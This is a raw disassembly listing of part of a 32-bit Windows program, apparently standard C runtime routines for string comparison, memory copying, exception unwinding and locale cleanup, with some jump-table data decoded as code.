  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
